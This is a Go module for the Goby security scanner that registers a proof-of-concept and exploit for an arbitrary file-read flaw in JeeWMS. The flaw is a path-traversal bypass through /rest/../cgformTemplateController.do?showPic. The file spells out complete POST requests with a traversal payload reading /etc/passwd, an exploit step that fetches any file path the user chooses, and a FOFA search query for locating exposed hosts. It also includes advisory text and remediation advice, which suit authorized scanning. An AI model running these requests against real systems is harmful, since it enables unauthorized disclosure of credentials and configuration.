package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "JeeWMS /rest/../cgformTemplateController.do File Read Vulnerability",
    "Description": "<p>JeeWMS is an enterprise application system. This vulnerability exists in the AuthInterceptor class and the cgformTemplateController interface of JeeWMS. Attackers can bypass path checks by crafting malicious requests and use the showPic interface to download arbitrary files. This vulnerability allows unauthorized attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure.</p>",
    "Product": "JeeWMS",
    "Homepage": "http://huayi-tec.com/h-col-138.html",
    "DisclosureDate": "2024-09-25",
    "PostTime": "2025-01-16",
    "Author": "yanyongju@baimaohui.net",
    "FofaQuery": "body=\"url:userController.do?userOrgSelect&userId=\" && body=\"loginController.do?changeDefaultOrg\"",
    "GobyQuery": "body=\"url:userController.do?userOrgSelect&userId=\" && body=\"loginController.do?changeDefaultOrg\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read arbitrary files by crafting malicious requests, potentially leading to sensitive information disclosure, system configuration exposure, and further attacks.</p>",
    "Recommendation": "<p>It is recommended to immediately fix the code logic, strictly validate path parameters to prevent directory traversal attacks. Additionally, restrict access to sensitive interfaces and upgrade to the secure version provided by the vendor to fix the vulnerability.</p>",
    "References": [
        "https://gitee.com/erzhongxmu/JEEWMS/issues/I8YN90"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "/etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/rest/../cgformTemplateController.do?showPic",
                "follow_redirect": true,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "code=default&path=../../../../../../../../../../../../../../../etc/passwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": "",
                        "visible": false
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": "",
                        "visible": false
                    }
                ],
                "visible": false
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/rest/../cgformTemplateController.do?showPic",
                "follow_redirect": true,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "code=default&path=../../../../../../../../../../../../../../..{{{filePath}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "JeeWMS /rest/../cgformTemplateController.do 文件读取漏洞",
            "Product": "JeeWMS",
            "Description": "<p>JeeWMS 是一款企业应用系统。该漏洞存在于 JeeWMS 的 AuthInterceptor 类和 cgformTemplateController 接口中，攻击者可以通过构造恶意请求绕过路径检查，并利用 showPic 接口下载任意文件。此漏洞允许未经授权的攻击者读取系统中的任意文件，可能导致敏感信息泄露。</p>",
            "Recommendation": "<p>建议立即修复代码逻辑，严格校验路径参数，避免目录穿越攻击。同时，限制对敏感接口的访问权限，升级至厂商提供的安全版本以修复漏洞。</p>",
            "Impact": "<p>该漏洞允许攻击者通过构造恶意请求读取任意文件，可能导致敏感信息泄露、系统配置暴露以及进一步的攻击。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "JeeWMS /rest/../cgformTemplateController.do File Read Vulnerability",
            "Product": "JeeWMS",
            "Description": "<p>JeeWMS is an enterprise application system. This vulnerability exists in the AuthInterceptor class and the cgformTemplateController interface of JeeWMS. Attackers can bypass path checks by crafting malicious requests and use the showPic interface to download arbitrary files. This vulnerability allows unauthorized attackers to read arbitrary files in the system, potentially leading to sensitive information disclosure.</p>",
            "Recommendation": "<p>It is recommended to immediately fix the code logic, strictly validate path parameters to prevent directory traversal attacks. Additionally, restrict access to sensitive interfaces and upgrade to the secure version provided by the vendor to fix the vulnerability.</p>",
            "Impact": "<p>This vulnerability allows attackers to read arbitrary files by crafting malicious requests, potentially leading to sensitive information disclosure, system configuration exposure, and further attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "||{{{fixedhostinfo}}}/rest/../cgformTemplateController.do?showPic"
    },
    "VariablesOrder": [
        "filePath",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9983"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
